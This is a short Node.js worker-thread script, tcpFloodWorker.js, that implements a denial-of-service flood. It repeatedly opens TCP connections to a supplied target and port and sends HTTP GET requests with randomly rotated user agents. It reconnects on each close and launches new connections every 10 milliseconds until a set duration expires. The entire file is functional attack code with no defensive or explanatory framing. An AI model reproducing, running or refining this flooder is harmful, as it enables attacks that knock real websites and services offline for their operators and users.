// tcpFloodWorker.js

import { parentPort, workerData } from 'worker_threads';
import net from 'net';

// Extract data from workerData
const { target, port, duration, userAgents } = workerData;

// Function to get a random user agent from the list
function getRandomUserAgent() {
  const index = Math.floor(Math.random() * userAgents.length);
  return userAgents[index];
}

// Function to initiate a TCP flood
function tcpFlood() {
  const client = new net.Socket();
  client.connect(port, target, () => {
    const userAgent = getRandomUserAgent();
    client.write(`GET / HTTP/1.1\r\nHost: ${target}\r\nUser-Agent: ${userAgent}\r\nConnection: keep-alive\r\n\r\n`);
  });

  client.on('error', (err) => {
    console.error(`Error: ${err.message}`);
  });

  client.on('close', () => {
    // Attempt to reconnect
    setTimeout(tcpFlood, 10);  // Delay to control the rate slightly
  });
}

// Duration control
const endTime = Date.now() + duration;
function startFlood() {
  if (Date.now() < endTime) {
    tcpFlood();
    setTimeout(startFlood, 10);  // Delay between requests to prevent overloading sockets
  } else {
    parentPort.postMessage('done'); // Notify completion to the main thread
  }
}

// Start the TCP flood
startFlood();
